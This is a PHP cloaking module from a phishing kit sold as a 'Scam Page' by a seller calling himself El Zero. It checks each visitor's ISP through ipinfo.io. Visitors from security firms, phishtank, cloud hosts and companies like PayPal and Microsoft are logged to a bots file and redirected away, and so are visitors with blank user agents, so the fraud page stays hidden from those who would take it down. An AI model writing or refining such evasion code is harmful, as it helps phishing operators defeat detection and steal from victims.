<?php

/*
▓█████ ██▓       ▒███████▓█████ ██▀███  ▒█████  
▓█   ▀▓██▒       ▒ ▒ ▒ ▄▀▓█   ▀▓██ ▒ ██▒██▒  ██▒
▒███  ▒██░       ░ ▒ ▄▀▒░▒███  ▓██ ░▄█ ▒██░  ██▒
▒▓█  ▄▒██░         ▄▀▒   ▒▓█  ▄▒██▀▀█▄ ▒██   ██░
░▒████░██████▒   ▒███████░▒████░██▓ ▒██░ ████▓▒░
░░ ▒░ ░ ▒░▓  ░   ░▒▒ ▓░▒░░░ ▒░ ░ ▒▓ ░▒▓░ ▒░▒░▒░ 
 ░ ░  ░ ░ ▒  ░   ░░▒ ▒ ░ ▒░ ░  ░ ░▒ ░ ▒░ ░ ▒ ▒░ 
   ░    ░ ░      ░ ░ ░ ░ ░  ░    ░░   ░░ ░ ░ ▒  
   ░  ░   ░  ░     ░ ░      ░  ░  ░        ░ ░  
                 ░                              
icq =>  @ElZero
telegram => @ElZeroCoder
Thanks For Buying My Scam Page
Copyright all Reserved to El Zero
*/

$user_ip = $IP;
$dp =  strtolower($_SERVER['HTTP_USER_AGENT']);
$shit_isps=array("DigitalOcean","Amazon","Google","phishtank","net4sec","AVAST Software s.r.o.","BullGuard ApS","PayPal","Hotmail","Yahoo","AOL","Microsoft","Kaspersky Lab","Linode, LLC","MSN","ONLINE S.A.S.","Joshua Peter McQuistan","OVH SAS","avira","Forcepoint","Cloud","Forcepoint Cloud Ltd","Google LLC","Facebook, Inc.");


$ipp=isset($user_ip)&&$user_ip!=""?$user_ip:"1.1.1.1";$ISP=@file_get_contents('http://ipinfo.io/'.$ipp.'/org');if($ISP==false){return "ppp";}

foreach($shit_isps as $isp){
	if(substr_count($ISP,$isp) > 0 or $dp == "" or $dp == " " or $dp == "	"){
		$content = "X-Sniper AntiBots => ".$ipp." [ XSniper1 ] \n";
		$save=fopen("priv/bots.txt","a+");
		fwrite($save,$content);fclose($save);
		header('Location: '.$redirectLink);exit();

	}
}

?>